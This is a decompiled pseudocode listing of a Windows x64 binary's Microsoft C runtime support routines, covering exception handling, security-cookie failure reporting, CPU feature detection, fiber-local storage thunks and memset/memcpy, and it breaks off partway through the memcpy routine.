// ===== sub_140002710 @ 0x140002710 size=0x8 =====
void sub_140002710()
{
  dword_14001C988 = 0;
}


// ===== __scrt_fastfail @ 0x140002718 size=0x14a =====
void __fastcall _scrt_fastfail(unsigned int a1)
{
  ULONG64 Rip; // rbx
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v3; // rax
  bool v4; // bl
  struct _EXCEPTION_POINTERS ExceptionInfo; // [rsp+40h] [rbp-C0h] BYREF
  _DWORD v6[4]; // [rsp+50h] [rbp-B0h] BYREF
  DWORD64 v7; // [rsp+60h] [rbp-A0h]
  struct _CONTEXT ContextRecord; // [rsp+F0h] [rbp-10h] BYREF
  DWORD64 retaddr; // [rsp+5C8h] [rbp+4C8h]
  __int64 v10; // [rsp+5D0h] [rbp+4D0h] BYREF
  unsigned __int64 ImageBase; // [rsp+5D8h] [rbp+4D8h] BYREF
  unsigned __int64 EstablisherFrame; // [rsp+5E0h] [rbp+4E0h] BYREF
  PVOID HandlerData; // [rsp+5E8h] [rbp+4E8h] BYREF

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(a1);
  sub_140002710();
  sub_140002F60(&ContextRecord, 0, 1232);
  RtlCaptureContext(&ContextRecord);
  Rip = ContextRecord.Rip;
  v3 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, nullptr);
  if ( v3 != nullptr )
    RtlVirtualUnwind(0, ImageBase, Rip, v3, &ContextRecord, &HandlerData, &EstablisherFrame, nullptr);
  ContextRecord.Rip = retaddr;
  ContextRecord.Rsp = (DWORD64)&v10;
  sub_140002F60(v6, 0, 152);
  v7 = retaddr;
  v6[0] = 1073741845;
  v6[1] = 1;
  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v6;
  v4 = IsDebuggerPresent();
  ExceptionInfo.ContextRecord = &ContextRecord;
  SetUnhandledExceptionFilter(nullptr);
  if ( UnhandledExceptionFilter(&ExceptionInfo) == 0 && !v4 )
    sub_140002710();
}


// ===== __scrt_get_show_window_mode @ 0x140002864 size=0x3a =====
WORD _scrt_get_show_window_mode()
{
  WORD result; // ax
  struct _STARTUPINFOW StartupInfo; // [rsp+20h] [rbp-78h] BYREF

  sub_140002F60(&StartupInfo, 0, 104);
  GetStartupInfoW(&StartupInfo);
  result = 10;
  if ( (StartupInfo.dwFlags & 1) != 0 )
    return StartupInfo.wShowWindow;
  return result;
}


// ===== j_UserMathErrorFunction @ 0x1400028a0 size=0x5 =====
// attributes: thunk
__int64 __fastcall j_UserMathErrorFunction(struct _exception *a1)
{
  return UserMathErrorFunction(a1);
}


// ===== __scrt_is_managed_app @ 0x1400028a8 size=0x52 =====
bool _scrt_is_managed_app()
{
  HMODULE ModuleHandleW; // rax
  char *v1; // rcx
  bool result; // al

  ModuleHandleW = GetModuleHandleW(nullptr);
  result = false;
  if ( ModuleHandleW != nullptr && *(_WORD *)ModuleHandleW == 23117 )
  {
    v1 = (char *)ModuleHandleW + *((int *)ModuleHandleW + 15);
    if ( *(_DWORD *)v1 == 17744
      && *((_WORD *)v1 + 12) == 523
      && *((_DWORD *)v1 + 33) > 0xEu
      && *((_DWORD *)v1 + 62) != 0 )
    {
      return true;
    }
  }
  return result;
}


// ===== __scrt_set_unhandled_exception_filter @ 0x1400028fc size=0xe =====
LPTOP_LEVEL_EXCEPTION_FILTER _scrt_set_unhandled_exception_filter()
{
  return SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)_scrt_unhandled_exception_filter);
}


// ===== __scrt_unhandled_exception_filter @ 0x14000290c size=0x37 =====
__int64 __fastcall _scrt_unhandled_exception_filter(_QWORD *a1)
{
  _DWORD *v1; // rax
  int v2; // ecx

  v1 = (_DWORD *)*a1;
  if ( *(_DWORD *)*a1 == -529697949 && v1[6] == 4 )
  {
    v2 = v1[8];
    if ( (unsigned int)(v2 - 429065504) <= 2 || v2 == 26820608 )
      terminate();
  }
  return 0;
}


// ===== sub_140002944 @ 0x140002944 size=0x3c =====
void sub_140002944()
{
  void (**i)(void); // rbx

  for ( i = qword_1400199E8; i < qword_1400199E8; ++i )
  {
    if ( *i != nullptr )
      (*i)();
  }
}


// ===== sub_140002980 @ 0x140002980 size=0x3c =====
void __fastcall sub_140002980()
{
  void (**i)(void); // rbx

  for ( i = &qword_1400199F8; i < &qword_1400199F8; ++i )
  {
    if ( *i != nullptr )
      (*i)();
  }
}


// ===== __raise_securityfailure @ 0x1400029bc size=0x34 =====
BOOL __fastcall _raise_securityfailure(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  HANDLE CurrentProcess; // rax

  SetUnhandledExceptionFilter(nullptr);
  UnhandledExceptionFilter(ExceptionInfo);
  CurrentProcess = GetCurrentProcess();
  return TerminateProcess(CurrentProcess, 0xC0000409);
}


// ===== __report_gsfailure @ 0x1400029f0 size=0xd1 =====
void __cdecl __noreturn _report_gsfailure(uintptr_t StackCookie)
{
  DWORD64 retaddr; // [rsp+38h] [rbp+0h]
  uintptr_t v2; // [rsp+40h] [rbp+8h] BYREF

  v2 = StackCookie;
  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(2u);
  capture_previous_context(&ContextRecord);
  ContextRecord.Rip = retaddr;
  ContextRecord.Rsp = (DWORD64)&v2;
  qword_14001C9A0 = retaddr;
  ContextRecord.Rcx = v2;
  dword_14001C990 = -1073740791;
  dword_14001C994 = 1;
  dword_14001C9A8 = 1;
  unk_14001C9B0 = 2;
  _raise_securityfailure((struct _EXCEPTION_POINTERS *)&ExceptionInfo);
}


// ===== capture_previous_context @ 0x140002ac4 size=0x71 =====
struct _IMAGE_RUNTIME_FUNCTION_ENTRY *__fastcall capture_previous_context(PCONTEXT ContextRecord)
{
  ULONG64 Rip; // rsi
  int i; // edi
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *result; // rax
  unsigned __int64 ImageBase; // [rsp+60h] [rbp+8h] BYREF
  unsigned __int64 EstablisherFrame; // [rsp+68h] [rbp+10h] BYREF
  PVOID HandlerData; // [rsp+70h] [rbp+18h] BYREF

  RtlCaptureContext(ContextRecord);
  Rip = ContextRecord->Rip;
  for ( i = 0; i < 2; ++i )
  {
    result = RtlLookupFunctionEntry(Rip, &ImageBase, nullptr);
    if ( result == nullptr )
      break;
    result = (struct _IMAGE_RUNTIME_FUNCTION_ENTRY *)RtlVirtualUnwind(
                                                       0,
                                                       ImageBase,
                                                       Rip,
                                                       result,
                                                       ContextRecord,
                                                       &HandlerData,
                                                       &EstablisherFrame,
                                                       nullptr);
  }
  return result;
}


// ===== __isa_available_init @ 0x140002b38 size=0x17b =====
int __cdecl _isa_available_init()
{
  char v5; // di
  int v6; // r10d
  int v7; // esi
  int v9; // r9d
  int v14; // r11d
  int v15; // eax
  unsigned __int64 v16; // rax
  __int64 v17; // rcx
  int v18; // r8d
  int v23; // eax

  _RAX = 0;
  dword_14001C01C = 2;
  dword_14001C018 = 1;
  __asm { cpuid }
  v5 = 0;
  v6 = _RDX;
  v7 = _RAX;
  _RAX = 1;
  v9 = _RCX ^ 0x6C65746E | _RBX ^ 0x756E6547;
  __asm { cpuid }
  v14 = _RCX;
  if ( (v6 ^ 0x49656E69 | v9) == 0
    && ((qword_14001C020 = -1, (v15 = _RAX & 0xFFF3FF0) == 67264)
     || v15 == 132704
     || v15 == 132720
     || (unsigned int)(v16 = (unsigned int)(v15 - 198224)) <= 0x20 && (v17 = 0x100010001LL, _bittest64(&v17, v16))) )
  {
    v18 = dword_14001CF00 | 1;
    dword_14001CF00 |= 1u;
  }
  else
  {
    v18 = dword_14001CF00;
  }
  _RAX = 7;
  if ( v7 >= 7 )
  {
    __asm { cpuid }
    v5 = _RBX;
    if ( (_RBX & 0x200) != 0 )
      dword_14001CF00 = v18 | 2;
  }
  if ( (v14 & 0x100000) != 0 )
  {
    dword_14001C018 = 2;
    dword_14001C01C = 6;
    if ( (v14 & 0x8000000) != 0 && (v14 & 0x10000000) != 0 )
    {
      __asm { xgetbv }
      if ( (_RAX & 6) == 6 )
      {
        v23 = dword_14001C01C | 8;
        dword_14001C018 = 3;
        dword_14001C01C |= 8u;
        if ( (v5 & 0x20) != 0 )
        {
          dword_14001C018 = 5;
          dword_14001C01C = v23 | 0x20;
        }
      }
    }
  }
  return 0;
}


// ===== __scrt_is_ucrt_dll_in_use @ 0x140002cb4 size=0xc =====
_BOOL8 _scrt_is_ucrt_dll_in_use()
{
  return dword_14001DBF4 != 0;
}


// ===== IsProcessorFeaturePresent @ 0x140002cc0 size=0x6 =====
// attributes: thunk
BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature)
{
  return __imp_IsProcessorFeaturePresent(ProcessorFeature);
}


// ===== __C_specific_handler @ 0x140002cc8 size=0x20b =====
EXCEPTION_DISPOSITION __cdecl _C_specific_handler(
        struct _EXCEPTION_RECORD *ExceptionRecord,
        void *EstablisherFrame,
        struct _CONTEXT *ContextRecord,
        struct _DISPATCHER_CONTEXT *DispatcherContext)
{
  DWORD64 ImageBase; // r12
  DWORD *HandlerData; // rbx
  unsigned __int64 v10; // r14
  DWORD ScopeIndex; // esi
  int v12; // eax
  DWORD v14; // r9d
  unsigned __int64 v15; // rdi
  DWORD v16; // r8d
  __int64 v17; // rcx
  DWORD i; // r10d
  __int64 v19; // rax
  _QWORD v20[2]; // [rsp+30h] [rbp-38h] BYREF

  _except_validate_context_record(ContextRecord);
  ImageBase = DispatcherContext->ImageBase;
  HandlerData = (DWORD *)DispatcherContext->HandlerData;
  v10 = DispatcherContext->ControlPc - ImageBase;
  ScopeIndex = DispatcherContext->ScopeIndex;
  if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )
  {
    v14 = *HandlerData;
    v15 = DispatcherContext->TargetIp - ImageBase;
    if ( ScopeIndex < *HandlerData )
    {
      v16 = *HandlerData;
      do
      {
        v17 = v16;
        if ( v10 >= HandlerData[4 * ScopeIndex + 1] && v10 < HandlerData[4 * ScopeIndex + 2] )
        {
          if ( (ExceptionRecord->ExceptionFlags & 0x20) != 0 )
          {
            for ( i = 0; i < v16; ++i )
            {
              if ( v15 >= HandlerData[4 * i + 1]
                && v15 < HandlerData[4 * i + 2]
                && HandlerData[4 * i + 4] == HandlerData[4 * ScopeIndex + 4]
                && HandlerData[4 * i + 3] == HandlerData[4 * ScopeIndex + 3] )
              {
                break;
              }
            }
            v17 = v14;
            if ( i != v14 )
              return ExceptionContinueSearch;
          }
          v19 = HandlerData[4 * ScopeIndex + 4];
          if ( (_DWORD)v19 != 0 )
          {
            if ( v15 == v19 && (ExceptionRecord->ExceptionFlags & 0x20) != 0 )
              return ExceptionContinueSearch;
          }
          else
          {
            LOBYTE(v17) = 1;
            DispatcherContext->ScopeIndex = ScopeIndex + 1;
            ((void (__fastcall *)(__int64, void *))(ImageBase + HandlerData[4 * ScopeIndex + 3]))(v17, EstablisherFrame);
            v14 = *HandlerData;
            LODWORD(v17) = *HandlerData;
          }
        }
        ++ScopeIndex;
        v16 = v17;
      }
      while ( ScopeIndex < (unsigned int)v17 );
    }
  }
  else
  {
    v20[0] = ExceptionRecord;
    v20[1] = ContextRecord;
    while ( ScopeIndex < *HandlerData )
    {
      if ( v10 >= HandlerData[4 * ScopeIndex + 1]
        && v10 < HandlerData[4 * ScopeIndex + 2]
        && HandlerData[4 * ScopeIndex + 4] != 0 )
      {
        if ( HandlerData[4 * ScopeIndex + 3] == 1 )
          goto LABEL_11;
        v12 = ((__int64 (__fastcall *)(_QWORD *, void *))(ImageBase + HandlerData[4 * ScopeIndex + 3]))(
                v20,
                EstablisherFrame);
        if ( v12 < 0 )
          return ExceptionContinueExecution;
        if ( v12 > 0 )
        {
LABEL_11:
          if ( ExceptionRecord->ExceptionCode == -529697949
            && _DestructExceptionObject != nullptr
            && (unsigned int)IsNonwritableInCurrentImage(&off_140011410) != 0 )
          {
            _DestructExceptionObject(ExceptionRecord, 1);
          }
          NLG_Notify(ImageBase + HandlerData[4 * ScopeIndex + 4], EstablisherFrame, 1);
          RtlUnwindEx(
            EstablisherFrame,
            (PVOID)(ImageBase + HandlerData[4 * ScopeIndex + 4]),
            ExceptionRecord,
            (PVOID)ExceptionRecord->ExceptionCode,
            DispatcherContext->ContextRecord,
            DispatcherContext->HistoryTable);
          _NLG_Return2();
        }
      }
      ++ScopeIndex;
    }
  }
  return ExceptionContinueSearch;
}


// ===== __vcrt_initialize @ 0x140002ed4 size=0x32 =====
__vcrt_bool __cdecl _vcrt_initialize()
{
  _vcrt_initialize_pure_virtual_call_handler();
  _vcrt_initialize_winapi_thunks();
  if ( (unsigned __int8)_vcrt_initialize_locks() == 0 )
    return false;
  if ( (unsigned __int8)_vcrt_initialize_ptd() == 0 )
  {
    _vcrt_uninitialize_locks();
    return false;
  }
  return true;
}


// ===== __vcrt_uninitialize @ 0x140002f08 size=0x20 =====
__vcrt_bool __cdecl _vcrt_uninitialize(__vcrt_bool Terminating)
{
  if ( !Terminating )
  {
    _vcrt_uninitialize_ptd();
    _vcrt_uninitialize_locks();
    _vcrt_uninitialize_winapi_thunks(0);
  }
  return true;
}


// ===== sub_140002F40 @ 0x140002f40 size=0x10 =====
__int64 __fastcall sub_140002F40(void *a1, char a2, unsigned __int64 a3)
{
  __int64 v3; // r11

  memset(a1, a2, a3);
  return v3;
}


// ===== sub_140002F60 @ 0x140002f60 size=0x190 =====
__int64 __fastcall sub_140002F60(__m128i *a1, unsigned __int8 a2, unsigned __int64 a3)
{
  __m128i v4; // xmm0
  __m128i *v5; // rcx
  unsigned __int64 v6; // r9
  unsigned __int64 i; // r9
  unsigned __int64 v8; // r8
  __int64 result; // rax
  __int64 v11; // kr18_8
  __int8 *v12; // rcx

  v11 = 0x101010101010101LL * a2;
  v12 = &a1->m128i_i8[a3];
  result = (__int64)a1;
  switch ( a3 )
  {
    case 0uLL:
      return result;
    case 1uLL:
      goto LABEL_16;
    case 2uLL:
      goto LABEL_24;
    case 3uLL:
      goto LABEL_15;
    case 4uLL:
      goto LABEL_18;
    case 5uLL:
      goto LABEL_21;
    case 6uLL:
      goto LABEL_23;
    case 7uLL:
      goto LABEL_14;
    case 8uLL:
      a1->m128i_i64[0] = v11;
      return result;
    case 9uLL:
      *(_QWORD *)(v12 - 9) = v11;
      *(v12 - 1) = v11;
      return result;
    case 0xAuLL:
      a1->m128i_i64[0] = v11;
      a1->m128i_i16[4] = v11;
      return result;
    case 0xBuLL:
      a1->m128i_i64[0] = v11;
      a1->m128i_i16[4] = v11;
      a1->m128i_i8[10] = v11;
      return result;
    case 0xCuLL:
      *(_QWORD *)(v12 - 12) = v11;
LABEL_18:
      *((_DWORD *)v12 - 1) = v11;
      return result;
    case 0xDuLL:
      *(_QWORD *)(v12 - 13) = v11;
LABEL_21:
      *(_DWORD *)(v12 - 5) = v11;
      *(v12 - 1) = v11;
      return result;
    case 0xEuLL:
      *(_QWORD *)(v12 - 14) = v11;
LABEL_23:
      *(_DWORD *)(v12 - 6) = v11;
LABEL_24:
      *((_WORD *)v12 - 1) = v11;
      return result;
    case 0xFuLL:
      *(_QWORD *)(v12 - 15) = v11;
LABEL_14:
      *(_DWORD *)(v12 - 7) = v11;
LABEL_15:
      *(_WORD *)(v12 - 3) = v11;
LABEL_16:
      *(v12 - 1) = v11;
      return result;
    case 0x10uLL:
      a1->m128i_i64[0] = v11;
      a1->m128i_i64[1] = v11;
      return result;
    default:
      v5 = a1;
      v4 = _mm_unpacklo_epi8((__m128i)(unsigned __int64)v11, (__m128i)(unsigned __int64)v11);
      if ( a3 <= 0x80 )
        goto LABEL_7;
      if ( _bittest(&dword_14001CF00, 1u) )
        return sub_140002F40(a1, a2, a3);
      *a1 = v4;
      v5 = (__m128i *)((unsigned __int64)&a1[1] & 0xFFFFFFFFFFFFFFF0uLL);
      a3 = &a1->m128i_i8[a3] - (__int8 *)v5;
      v6 = a3 >> 7;
      if ( a3 >> 7 != 0 )
      {
        do
        {
          *v5 = v4;
          v5[1] = v4;
          v5 += 8;
          v5[-6] = v4;
          v5[-5] = v4;
          --v6;
          v5[-4] = v4;
          v5[-3] = v4;
          v5[-2] = v4;
          v5[-1] = v4;
        }
        while ( v6 != 0 );
        a3 &= 0x7Fu;
      }
LABEL_7:
      for ( i = a3 >> 4; i != 0; --i )
        *v5++ = v4;
      v8 = a3 & 0xF;
      if ( v8 != 0 )
        *(__m128i *)((char *)v5 + v8 - 16) = v4;
      return (__int64)a1;
  }
}


// ===== _NLG_Notify @ 0x140003100 size=0x21 =====
void NLG_Notify()
{
  ;
}


// ===== __NLG_Return2 @ 0x140003130 size=0x1 =====
void _NLG_Return2()
{
  ;
}


// ===== __except_validate_context_record @ 0x140003134 size=0x37 =====
void (*_except_validate_context_record())()
{
  return guard_check_icall_nop;
}


// ===== __DestructExceptionObject @ 0x14000316c size=0x71 =====
void __fastcall _DestructExceptionObject(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rcx

  if ( a1 != 0
    && *(_DWORD *)a1 == -529697949
    && *(_DWORD *)(a1 + 24) == 4
    && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )
  {
    v1 = *(_QWORD *)(a1 + 48);
    if ( v1 != 0 )
    {
      v2 = *(int *)(v1 + 4);
      if ( (_DWORD)v2 != 0 )
      {
        ((void (__fastcall *)(_QWORD))(*(_QWORD *)(a1 + 56) + v2))(*(_QWORD *)(a1 + 40));
      }
      else if ( (*(_BYTE *)v1 & 0x10) != 0 )
      {
        v3 = **(_QWORD **)(a1 + 40);
        if ( v3 != 0 )
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);
      }
    }
  }
}


// ===== ?_CallMemberFunction0@@YAXQEAX0@Z @ 0x1400031e0 size=0x3 =====
void __fastcall _CallMemberFunction0(void *const a1, void (__fastcall *a2)(void *const))
{
  a2(a1);
}


// ===== __vcrt_freefls @ 0x1400031e4 size=0x1f =====
void __fastcall _vcrt_freefls(void *a1)
{
  if ( a1 != nullptr && a1 != &unk_14001CF10 )
    j__free_base(a1);
}


// ===== __vcrt_initialize_ptd @ 0x140003204 size=0x51 =====
char _vcrt_initialize_ptd()
{
  DWORD v0; // eax

  v0 = _vcrt_FlsAlloc(_vcrt_freefls);
  dword_14001C030 = v0;
  if ( v0 != -1 )
  {
    if ( (unsigned int)_vcrt_FlsSetValue(v0, &unk_14001CF10) != 0 )
    {
      dword_14001CF88 = -2;
      qword_14001CF90 = -2;
      return 1;
    }
    _vcrt_uninitialize_ptd();
  }
  return 0;
}


// ===== __vcrt_uninitialize_ptd @ 0x140003258 size=0x22 =====
char _vcrt_uninitialize_ptd()
{
  if ( dword_14001C030 != -1 )
  {
    _vcrt_FlsFree();
    dword_14001C030 = -1;
  }
  return 1;
}


// ===== __vcrt_initialize_locks @ 0x14000327c size=0x46 =====
char _vcrt_initialize_locks()
{
  __int64 v0; // rbx

  v0 = 0;
  while ( (unsigned int)_vcrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)&unk_14001CFA0 + v0, 0xFA0u) != 0 )
  {
    ++dword_14001CFC8;
    v0 = (unsigned int)(v0 + 1);
    if ( (_DWORD)v0 != 0 )
      return 1;
  }
  _vcrt_uninitialize_locks();
  return 0;
}


// ===== __vcrt_uninitialize_locks @ 0x1400032c4 size=0x37 =====
char _vcrt_uninitialize_locks()
{
  int v0; // ebx

  v0 = dword_14001CFC8;
  while ( v0 != 0 )
  {
    DeleteCriticalSection((LPCRITICAL_SECTION)&unk_14001CFA0 + (unsigned int)--v0);
    --dword_14001CFC8;
  }
  return 1;
}


// ===== ?try_get_function@@YAPEAXW4function_id@?A0x37284e77@@QEBDQEBW4module_id@2@2@Z @ 0x1400032fc size=0x1d6 =====
FARPROC __fastcall try_get_function(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4)
{
  __int64 v4; // r15
  unsigned int *v6; // rbp
  uintptr_t v8; // r10
  __int64 v9; // rdx
  FARPROC result; // rax
  __int64 v11; // rsi
  HMODULE Library; // rbx
  const WCHAR *v13; // r14

  v4 = a1;
  v6 = a3;
  v8 = _security_cookie;
  v9 = __ROR8__(qword_14001CFE8[a1] ^ _security_cookie, _security_cookie & 0x3F);
  if ( v9 == -1 )
    return nullptr;
  if ( v9 != 0 )
    return (FARPROC)v9;
  if ( a3 == a4 )
  {
LABEL_21:
    Library = nullptr;
    goto LABEL_22;
  }
  while ( 1 )
  {
    v11 = *v6;
    Library = (HMODULE)qword_14001CFD0[v11];
    if ( Library == nullptr )
      break;
    if ( Library != (HMODULE)-1LL )
      goto LABEL_25;
LABEL_19:
    if ( ++v6 == a4 )
    {
      v8 = _security_cookie;
      goto LABEL_21;
    }
  }
  v13 = off_140011418[v11];
  Library = LoadLibraryExW(v13, nullptr, 0x800u);
  if ( Library == nullptr )
  {
    if ( GetLastError() != 87 || wcsncmp(v13, L"api-ms-", 7u) == 0 || wcsncmp(v13, L"ext-ms-", 7u) == 0 )
      Library = nullptr;
    else
      Library = LoadLibraryExW(v13, nullptr, 0);
  }
  if ( Library == nullptr )
  {
    _InterlockedExchange64(&qword_14001CFD0[v11], -1);
    goto LABEL_19;
  }
  if ( _InterlockedExchange64(&qword_14001CFD0[v11], (__int64)Library) != 0 )
    FreeLibrary(Library);
LABEL_25:
  v8 = _security_cookie;
LABEL_22:
  if ( Library != nullptr )
  {
    result = GetProcAddress(Library, a2);
    if ( result != nullptr )
    {
      _InterlockedExchange64(
        &qword_14001CFE8[v4],
        _security_cookie ^ __ROR8__(result, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)));
      return result;
    }
    v8 = _security_cookie;
  }
  _InterlockedExchange64(&qword_14001CFE8[v4], v8 ^ __ROR8__(-1, 64 - ((unsigned __int8)v8 & 0x3Fu)));
  return nullptr;
}


// ===== __vcrt_FlsAlloc @ 0x1400034d4 size=0x45 =====
DWORD __fastcall _vcrt_FlsAlloc(__int64 a1)
{
  FARPROC function; // rax

  function = try_get_function(0, "FlsAlloc", (unsigned int *)&unk_1400114E8, (unsigned int *)"FlsAlloc");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(__int64))function)(a1);
  else
    return TlsAlloc();
}


// ===== __vcrt_FlsFree @ 0x14000351c size=0x46 =====
int __fastcall _vcrt_FlsFree(DWORD a1)
{
  FARPROC function; // rax

  function = try_get_function(1u, "FlsFree", (unsigned int *)&unk_140011500, (unsigned int *)"FlsFree");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(_QWORD))function)(a1);
  else
    return TlsFree(a1);
}


// ===== __vcrt_FlsSetValue @ 0x140003564 size=0x51 =====
int __fastcall _vcrt_FlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue)
{
  FARPROC function; // rax

  function = try_get_function(3u, "FlsSetValue", (unsigned int *)&unk_140011510, (unsigned int *)"FlsSetValue");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(_QWORD, LPVOID))function)(dwTlsIndex, lpTlsValue);
  else
    return TlsSetValue(dwTlsIndex, lpTlsValue);
}


// ===== __vcrt_InitializeCriticalSectionEx @ 0x1400035b8 size=0x61 =====
int __fastcall _vcrt_InitializeCriticalSectionEx(
        LPCRITICAL_SECTION lpCriticalSection,
        DWORD dwSpinCount,
        unsigned int a3)
{
  FARPROC function; // rax

  function = try_get_function(
               4u,
               "InitializeCriticalSectionEx",
               (unsigned int *)&unk_140011528,
               (unsigned int *)"InitializeCriticalSectionEx");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(LPCRITICAL_SECTION, _QWORD, _QWORD))function)(lpCriticalSection, dwSpinCount, a3);
  else
    return InitializeCriticalSectionAndSpinCount(lpCriticalSection, dwSpinCount);
}


// ===== __vcrt_initialize_winapi_thunks @ 0x14000361c size=0x2f =====
uintptr_t _vcrt_initialize_winapi_thunks()
{
  uintptr_t result; // rax

  result = _security_cookie;
  memset64(qword_14001CFE8, _security_cookie, &qword_14001D010 >= qword_14001CFE8 ? 5 : 0);
  return result;
}


// ===== __vcrt_uninitialize_winapi_thunks @ 0x14000364c size=0x3e =====
__int64 *__fastcall _vcrt_uninitialize_winapi_thunks(char a1)
{
  __int64 *v1; // rbx
  HMODULE v2; // rcx
  __int64 *result; // rax

  if ( a1 == 0 )
  {
    v1 = qword_14001CFD0;
    do
    {
      v2 = (HMODULE)*v1;
      if ( *v1 != 0 )
      {
        if ( v2 != (HMODULE)-1LL )
          FreeLibrary(v2);
        *v1 = 0;
      }
      ++v1;
      result = qword_14001CFE8;
    }
    while ( v1 != qword_14001CFE8 );
  }
  return result;
}


// ===== __vcrt_initialize_pure_virtual_call_handler @ 0x14000368c size=0xf =====
uintptr_t _vcrt_initialize_pure_virtual_call_handler()
{
  qword_14001D010 = _security_cookie;
  return _security_cookie;
}


// ===== sub_1400036B0 @ 0x1400036b0 size=0x13 =====
__int64 __fastcall sub_1400036B0(void *a1, __int64 a2, unsigned __int64 a3)
{
  const void *v3; // r10
  __int64 v4; // r11

  qmemcpy(a1, v3, a3);
  return v4;
}


// ===== sub_1400036D0 @ 0x1400036d0 size=0x425 =====
__int64 __fastcall sub_1400036D0(__m128i *a1, const __m128i *a2, unsigned __int64 a3)
{
  bool v5; // cf
  __int64 v6; // rdx
  __int64 result; // rax
  __m128i v8; // xmm1
  __int8 v9; // r8
  __int16 v10; // cx
  __int8 v11; // r9
  __int8 v12; // r8
  __int16 v13; // r8
  __int16 v14; // r8
  __int8 v15; // r9
  __int32 v16; // ecx
  __int8 v17; // r9
  __int8 v18; // cl
  __int16 v19; // cx
  __int32 v20; // ecx
  __int32 v21; // ecx
  __int16 v22; // r9
  __int32 v23; // ecx
  __int16 v24; // r9
  __int8 v25; // r10
  __m128 v26; // xmm0
  __int8 *v27; // r8
  unsigned __int64 v28; // rcx
  __m128 v29; // xmm1
  unsigned __int64 v30; // rcx
  unsigned __int64 v31; // r8
  unsigned __int64 v32; // r9
  __int128 v33; // xmm0
  __int128 v34; // xmm1
  __int128 v35; // xmm1
  __int128 v36; // xmm1
  __m128 v37; // xmm0
  __m128 v38; // xmm1
  unsigned __int64 j; // r9
  unsigned __int64 v40; // r8
  __m128 v41; // xmm0
  __m128 v42; // xmm1
  __m128 v43; // xmm1
  __m128 v44; // xmm0
  __m128 v45; // xmm1
  __int8 *v46; // rcx
  __int128 v47; // xmm0
  unsigned __int64 v48; // rcx
  unsigned __int64 v49; // r8
  _OWORD *v50; // rax
  __int128 v51; // xmm1
  unsigned __int64 v52; // r9
  __int128 v53; // xmm0
  __int128 v54; // xmm1
  __int128 v55; // xmm1
  __int128 v56; // xmm1
  __int128 v57; // xmm0
  __int128 v58; // xmm1
  unsigned __int64 i; // r9

  result = (__int64)a1;
  switch ( a3 )
  {
    case 0uLL:
      return result;
    case 1uLL:
      a1->m128i_i8[0] = a2->m128i_i8[0];
      break;
    case 2uLL:
      a1->m128i_i16[0] = a2->m128i_i16[0];
      break;
    case 3uLL:
      v9 = a2->m128i_i8[2];
      a1->m128i_i16[0] = a2->m128i_i16[0];
      a1->m128i_i8[2] = v9;
      break;
    case 4uLL:
      a1->m128i_i32[0] = a2->m128i_i32[0];
      break;
    case 5uLL:
      v12 = a2->m128i_i8[4];
      a1->m128i_i32[0] = a2->m128i_i32[0];
      a1->m128i_i8[4] = v12;
      break;
    case 6uLL:
      v13 = a2->m128i_i16[2];
      a1->m128i_i32[0] = a2->m128i_i32[0];
      a1->m128i_i16[2] = v13;
      break;
    case 7uLL:
      v14 = a2->m128i_i16[2];
      v15 = a2->m128i_i8[6];
      a1->m128i_i32[0] = a2->m128i_i32[0];
      a1->m128i_i16[2] = v14;
      a1->m128i_i8[6] = v15;
      break;
    case 8uLL:
      a1->m128i_i64[0] = a2->m128i_i64[0];
      break;
    case 9uLL:
      v18 = a2->m128i_i8[8];
      *(_QWORD *)result = a2->m128i_i64[0];
      *(_BYTE *)(result + 8) = v18;
      break;
    case 0xAuLL:
      v19 = a2->m128i_i16[4];
      *(_QWORD *)result = a2->m128i_i64[0];
      *(_WORD *)(result + 8) = v19;
      break;
    case 0xBuLL:
      v10 = a2->m128i_i16[4];
      v11 = a2->m128i_i8[10];
      *(_QWORD *)result = a2->m128i_i64[0];
      *(_WORD *)(result + 8) = v10;
      *(_BYTE *)(result + 10) = v11;
      break;
    case 0xCuLL:
      v20 = a2->m128i_i32[2];
      *(_QWORD *)result = a2->m128i_i64[0];
      *(_DWORD *)(result + 8) = v20;
      break;
    case 0xDuLL:
      v16 = a2->m128i_i32[2];
      v17 = a2->m128i_i8[12];
      *(_QWORD *)result = a2->m128i_i64[0];
      *(_DWORD *)(result + 8) = v16;
      *(_BYTE *)(result + 12) = v17;
      break;
    case 0xEuLL:
      v21 = a2->m128i_i32[2];
      v22 = a2->m128i_i16[6];
      *(_QWORD *)result = a2->m128i_i64[0];
      *(_DWORD *)(result + 8) = v21;
      *(_WORD *)(result + 12) = v22;
      break;
    case 0xFuLL:
      v23 = a2->m128i_i32[2];
      v24 = a2->m128i_i16[6];
      v25 = a2->m128i_i8[14];
      *(_QWORD *)result = a2->m128i_i64[0];
      *(_DWORD *)(result + 8) = v23;
      *(_WORD *)(result + 12) = v24;
      *(_BYTE *)(result + 14) = v25;
      break;
    case 0x10uLL:
      *a1 = _mm_loadu_si128(a2);
      break;
    default:
      if ( a3 <= 0x20 )
      {
        v8 = *(const __m128i *)((char *)a2 + a3 - 16);
        *a1 = *a2;
        *(__m128i *)((char *)a1 + a3 - 16) = v8;
        result = (__int64)a1;
      }
      else
      {
        v5 = a2 < a1;
        v6 = (char *)a2 - (char *)a1;
        if ( v5 && a1 < (__m128i *)&a2->m128i_i8[a3] )
        {
          v46 = &a1->m128i_i8[a3];
          v47 = *(_OWORD *)&v46[v6 - 16];
